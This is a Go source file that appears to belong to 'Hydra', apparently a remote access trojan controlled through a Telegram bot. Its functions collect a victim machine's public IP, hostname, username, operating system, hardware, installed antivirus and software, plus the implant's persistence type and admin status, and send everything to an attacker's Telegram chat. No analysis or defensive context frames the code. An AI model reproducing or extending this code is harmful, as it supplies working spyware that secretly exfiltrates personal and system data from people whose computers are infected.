package commands

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/install"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
	softInfo = "```\nInstalled Software:\n    %s```"
	fmtInst  = "```\nHydra v2.1\nIIF Loaded: %v\nBase: %s\nInstall Date: %s\nPersistence: %d\nElevated: %v\n```"
)

func Info() {
	resp, err := http.Get("https://bot.whatismyipaddress.com/")
	util.Handle(err)
	defer resp.Body.Close()

	ip, err := ioutil.ReadAll(resp.Body)
	util.Handle(err)

	host, _ := os.Hostname()
	usr, _ := user.Current()

	avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)

	cfg := tgbotapi.NewMessage(
		util.ChatID,
		fmt.Sprintf(
			fmtInfo, ip, host, usr.Name, usr.Username,
			runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
			util.GPUInfo(), util.MemoryInfo(), avs,
		),
	)
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}

func Software() {
	soft := util.SoftwareInfo()
	api.SendFragmented(soft, "\n", "```\n", "```")
}

func InstanceInfo() {
	cfg := tgbotapi.NewMessage(util.ChatID,
		fmt.Sprintf(fmtInst,
			install.Info.Loaded,
			install.Info.Base,
			strings.Replace(install.Info.Date.Format(time.RFC3339), "T", " ", 1),
			install.Info.PType,
			util.RunningAsAdmin(),
		),
	)
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}
